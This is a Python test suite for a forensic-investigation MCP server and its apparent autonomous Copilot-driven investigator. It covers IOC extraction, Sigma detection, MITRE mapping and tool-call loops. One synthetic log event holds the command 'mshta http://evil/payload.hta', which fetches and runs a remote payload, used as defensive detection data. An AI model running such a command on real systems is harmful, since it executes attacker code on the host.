#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests du serveur MCP DFIR et de l'enqueteur autonome GitHub Copilot
(mcp-server/phoenix_dfir_mcp)."""

import json
import os
import sys

import pytest

_MCP_DIR = os.path.join(os.path.dirname(__file__), '..', '..', 'mcp-server')
if _MCP_DIR not in sys.path:
    sys.path.insert(0, _MCP_DIR)

from phoenix_dfir_mcp import investigator, server, toolkit, zimmermann  # noqa: E402


# ============================================================================
# Boite a outils
# ============================================================================

EXPECTED_TOOLS = {
    'list_artifacts', 'analyze_artifact', 'parse_evtx', 'parse_csv',
    'parse_json_file', 'parse_log_file', 'parse_prefetch', 'parse_lnk',
    'parse_browser_history', 'extract_iocs', 'sigma_scan', 'mitre_map_events',
    'virustotal_lookup', 'zimmermann_status', 'run_zimmermann', 'save_report',
    # Memoire d'enquete (inspire de PentAGI)
    'set_investigation_plan', 'complete_plan_step', 'record_finding',
    'set_hypothesis', 'get_case_state',
}


def test_registre_outils_complet():
    tools = toolkit.list_tools()
    assert {t['name'] for t in tools} == EXPECTED_TOOLS
    for t in tools:
        assert t['description']
        assert t['inputSchema']['type'] == 'object'


def test_format_openai_function_calling():
    tools = toolkit.openai_tools()
    assert len(tools) == len(EXPECTED_TOOLS)
    for t in tools:
        assert t['type'] == 'function'
        assert t['function']['name'] in EXPECTED_TOOLS
        assert t['function']['parameters']['type'] == 'object'


def test_outil_inconnu_retourne_erreur():
    result = toolkit.run_tool('outil_inexistant', {})
    assert 'error' in result


def test_extract_iocs():
    result = toolkit.run_tool('extract_iocs', {
        'text': 'Beacon vers 185.220.101.5 (evil-c2.xyz), hash d41d8cd98f00b204e9800998ecf8427e, CVE-2024-1234',
    })
    types = {i['type'] for i in result['iocs']}
    assert {'ip', 'domain', 'hash_md5', 'cve'} <= types


def test_list_artifacts(tmp_path):
    (tmp_path / 'security.evtx').write_bytes(b'ElfFile-fake')
    (tmp_path / 'access.log').write_text('GET /admin 401\n')
    result = toolkit.run_tool('list_artifacts', {'case_dir': str(tmp_path)})
    assert result['total'] == 2
    by_name = {a['name']: a for a in result['artifacts']}
    assert 'EVTX' in by_name['security.evtx']['type']
    assert len(by_name['access.log']['sha256']) == 64


def test_list_artifacts_dossier_inconnu():
    assert 'error' in toolkit.run_tool('list_artifacts', {'case_dir': '/nulle/part'})


def test_sigma_scan_evenements_synthetiques():
    events = [{'event_id': 4625, 'data': {}} for _ in range(6)]
    events.append({'event_id': 1102, 'data': {}})
    events.append({'event_id': 4624, 'data': {'LogonType': '9'}})
    normalized = [toolkit._sigma_normalize_event(e) for e in events]
    result = toolkit._sigma_scan_events(normalized)
    rule_ids = {a['rule_id'] for a in result['alerts']}
    assert {'phoenix-brute-force', 'phoenix-log-clearing', 'phoenix-pass-the-hash'} <= rule_ids


def test_normalisation_sigma_champs_evtx():
    evt = {'event_id': 1, 'timestamp': '2026-01-01T00:00:00', 'data': {
        'Image': 'C:\\Windows\\System32\\mshta.exe',
        'CommandLine': 'mshta http://evil/payload.hta',
        'LogonType': '3',
    }}
    norm = toolkit._sigma_normalize_event(evt)
    assert norm['image'].endswith('mshta.exe')
    assert norm['command_line'].startswith('mshta')
    assert norm['logon_type'] == 3


def test_mitre_map_events():
    result = toolkit.run_tool('mitre_map_events', {'event_ids': [4625, 1102]})
    assert 'Credential Access' in result['tactics']
    assert 'Defense Evasion' in result['tactics']


def test_virustotal_sans_cle(monkeypatch):
    monkeypatch.delenv('API_KEY_VT', raising=False)
    result = toolkit.run_tool('virustotal_lookup', {'ioc_type': 'ip', 'value': '1.2.3.4'})
    assert 'API_KEY_VT' in result['error']


def test_save_report(tmp_path):
    result = toolkit.run_tool('save_report', {
        'case_dir': str(tmp_path), 'title': 'Cas 42', 'markdown': 'Resume executif.',
    })
    assert result['saved']
    content = open(result['report_path'], encoding='utf-8').read()
    assert content.startswith('# Cas 42')
    assert 'Resume executif.' in content


# ============================================================================
# Outils Eric Zimmermann
# ============================================================================

def test_zimmermann_status_sans_installation(monkeypatch):
    monkeypatch.delenv('EZ_TOOLS_PATH', raising=False)
    monkeypatch.setattr(zimmermann.shutil, 'which', lambda *_: None)
    st = zimmermann.status()
    assert st['available'] == {}
    assert 'EvtxECmd' in st['missing']
    assert 'ericzimmerman.github.io' in st['help']


def test_run_zimmermann_outil_absent(monkeypatch, tmp_path):
    monkeypatch.delenv('EZ_TOOLS_PATH', raising=False)
    monkeypatch.setattr(zimmermann.shutil, 'which', lambda *_: None)
    artefact = tmp_path / 'sample.pf'
    artefact.write_bytes(b'MAM\x04fake')
    result = zimmermann.run('PECmd', str(artefact))
    assert 'introuvable' in result['error']
    assert 'help' in result


def test_run_zimmermann_outil_non_supporte():
    assert 'error' in zimmermann.run('OutilInconnu', '/tmp/x')


# ============================================================================
# Serveur MCP (JSON-RPC stdio)
# ============================================================================

def test_mcp_initialize():
    resp = server.handle_message({
        'jsonrpc': '2.0', 'id': 1, 'method': 'initialize',
        'params': {'protocolVersion': '2025-06-18', 'clientInfo': {'name': 'copilot'}},
    })
    assert resp['result']['protocolVersion'] == '2025-06-18'
    assert resp['result']['serverInfo']['name'] == 'phoenix-dfir'
    assert 'tools' in resp['result']['capabilities']


def test_mcp_notification_sans_reponse():
    assert server.handle_message({'jsonrpc': '2.0', 'method': 'notifications/initialized'}) is None


def test_mcp_tools_list():
    resp = server.handle_message({'jsonrpc': '2.0', 'id': 2, 'method': 'tools/list'})
    assert {t['name'] for t in resp['result']['tools']} == EXPECTED_TOOLS


def test_mcp_tools_call():
    resp = server.handle_message({
        'jsonrpc': '2.0', 'id': 3, 'method': 'tools/call',
        'params': {'name': 'extract_iocs', 'arguments': {'text': 'ip 185.220.101.5'}},
    })
    assert resp['result']['isError'] is False
    payload = json.loads(resp['result']['content'][0]['text'])
    assert payload['total'] >= 1


def test_mcp_tools_call_erreur():
    resp = server.handle_message({
        'jsonrpc': '2.0', 'id': 4, 'method': 'tools/call',
        'params': {'name': 'list_artifacts', 'arguments': {'case_dir': '/nulle/part'}},
    })
    assert resp['result']['isError'] is True


def test_mcp_methode_inconnue():
    resp = server.handle_message({'jsonrpc': '2.0', 'id': 5, 'method': 'resources/list'})
    assert resp['error']['code'] == -32601


# ============================================================================
# Enqueteur autonome (GitHub Copilot simule)
# ============================================================================

def _tool_call(cid, name, args):
    return {'tool_calls': [{'id': cid, 'type': 'function',
                            'function': {'name': name, 'arguments': json.dumps(args)}}]}


def test_investigation_autonome_boucle_complete(monkeypatch, tmp_path):
    (tmp_path / 'auth.log').write_text('Failed password for root from 203.0.113.7\n' * 8)

    class FakeCopilot:
        calls = 0

        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}

        def chat(self, messages, tools=None, model=None):
            # Passe adviser : appelee sans outils
            if tools is None:
                return {'content': 'APPROVED: enquete complete et etayee.'}
            self.usage['calls'] += 1
            self.usage['total_tokens'] += 50
            FakeCopilot.calls += 1
            if FakeCopilot.calls == 1:
                return _tool_call('c1', 'list_artifacts', {'case_dir': str(tmp_path)})
            if FakeCopilot.calls == 2:
                assert messages[-1]['role'] == 'tool'
                assert 'auth.log' in messages[-1]['content']
                return _tool_call('c2', 'record_finding', {
                    'case_dir': str(tmp_path), 'title': 'Brute force SSH',
                    'severity': 'high', 'evidence': 'auth.log', 'mitre': 'T1110',
                    'confidence': 'confirmed'})
            if FakeCopilot.calls == 3:
                return _tool_call('c3', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'Brute force SSH',
                    'markdown': 'Attaque confirmee.'})
            return {'content': 'Enquete close : brute force SSH depuis 203.0.113.7.'}

    monkeypatch.setattr(investigator, 'CopilotClient', FakeCopilot)
    result = investigator.investigate(str(tmp_path))

    assert 'brute force' in result['summary'].lower()
    assert result['report_path'] and os.path.exists(result['report_path'])
    assert [t['tool'] for t in result['tool_calls']] == ['list_artifacts', 'record_finding', 'save_report']
    # Metriques d'observabilite
    assert result['metrics']['findings'] == 1
    assert result['metrics']['findings_critical_or_high'] == 1
    assert result['metrics']['total_tokens'] > 0
    assert 'APPROVED' in result['metrics']['adviser_verdict']
    # Le rapport annexe la synthese memoire
    report = open(result['report_path'], encoding='utf-8').read()
    assert 'Brute force SSH' in report and 'Synthese' in report


def test_memoire_findings_hypotheses(tmp_path):
    d = str(tmp_path)
    toolkit.run_tool('set_investigation_plan', {'case_dir': d, 'steps': ['a', 'b', 'c']})
    toolkit.run_tool('record_finding', {'case_dir': d, 'title': 'LSASS dump',
                                        'severity': 'critical', 'mitre': 'T1003.001'})
    r = toolkit.run_tool('set_hypothesis', {'case_dir': d, 'hypothesis': 'Vol de creds',
                                            'status': 'open'})
    assert 'created' in r
    # Mise a jour de la meme hypothese
    r = toolkit.run_tool('set_hypothesis', {'case_dir': d, 'hypothesis': 'Vol de creds',
                                            'status': 'confirmed', 'rationale': 'Mimikatz'})
    assert 'updated' in r and r['updated']['status'] == 'confirmed'
    r = toolkit.run_tool('complete_plan_step', {'case_dir': d, 'step_index': 1, 'note': 'ok'})
    assert r['remaining_steps'] == 2
    state = toolkit.run_tool('get_case_state', {'case_dir': d})
    assert state['summary']['findings'] == 1
    assert state['summary']['critical_or_high'] == 1
    assert state['summary']['hypotheses_confirmed'] == 1


def test_detection_boucle_injecte_un_conseil(monkeypatch, tmp_path):
    (tmp_path / 'x.log').write_text('rien\n')

    class LoopingCopilot:
        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}
            self.nudged = False

        def chat(self, messages, tools=None, model=None):
            if tools is None:
                return {'content': 'APPROVED'}
            self.usage['calls'] += 1
            # Detecter le message anti-boucle injecte
            if any(m['role'] == 'user' and 'memes arguments' in m.get('content', '')
                   for m in messages):
                self.nudged = True
                return _tool_call('end', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'T', 'markdown': 'fin'})
            # Rejouer sans cesse le meme appel
            return _tool_call('same', 'get_case_state', {'case_dir': str(tmp_path)})

    fake = LoopingCopilot()
    monkeypatch.setattr(investigator, 'CopilotClient', lambda **kw: fake)
    investigator.investigate(str(tmp_path), max_steps=10, enable_adviser=False)
    assert fake.nudged, "le nudge anti-boucle doit etre injecte apres repetitions"


def test_adviser_relance_sur_gaps(monkeypatch, tmp_path):
    (tmp_path / 'a.log').write_text('data\n')

    class GapsCopilot:
        calls = 0

        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}
            self.adviser_calls = 0
            self.v2_done = False

        def chat(self, messages, tools=None, model=None):
            if tools is None:  # adviser
                self.adviser_calls += 1
                # Premiere revue : lacunes ; l'enqueteur doit corriger
                return {'content': 'GAPS: timeline manquante' if self.adviser_calls == 1
                        else 'APPROVED: complet'}
            GapsCopilot.calls += 1
            if GapsCopilot.calls == 1:
                return _tool_call('r1', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'T', 'markdown': 'v1'})
            if not self.v2_done and any('lacunes' in m.get('content', '')
                                        for m in messages if m['role'] == 'user'):
                # A recu le retour adviser : reappelle save_report une fois
                self.v2_done = True
                return _tool_call('r2', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'T', 'markdown': 'v2 avec timeline'})
            return {'content': 'termine'}

    fake = GapsCopilot()
    monkeypatch.setattr(investigator, 'CopilotClient', lambda **kw: fake)
    result = investigator.investigate(str(tmp_path), max_steps=10)
    assert fake.adviser_calls >= 1
    assert 'APPROVED' in (result['metrics']['adviser_verdict'] or '')


def test_investigation_sans_jeton_erreur_explicite(monkeypatch, tmp_path):
    monkeypatch.delenv('GITHUB_TOKEN', raising=False)
    monkeypatch.delenv('PHOENIX_GITHUB_TOKEN', raising=False)
    from phoenix_dfir_mcp.copilot import CopilotClient, CopilotError
    with pytest.raises(CopilotError, match='GITHUB_TOKEN'):
        CopilotClient().chat([{'role': 'user', 'content': 'test'}])
